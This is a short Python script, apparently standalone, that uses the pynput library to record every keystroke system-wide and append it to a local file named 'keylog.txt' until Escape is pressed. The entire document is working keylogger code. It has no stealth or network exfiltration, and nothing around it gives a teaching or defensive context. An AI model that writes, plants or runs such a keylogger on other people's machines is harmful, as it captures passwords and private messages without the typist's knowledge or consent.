from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as file:
            file.write(f"{key.char}")
    except AttributeError:  # Handles special keys like space, enter, etc.
        with open("keylog.txt", "a") as file:
            file.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when 'Escape' key is pressed
        return False

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
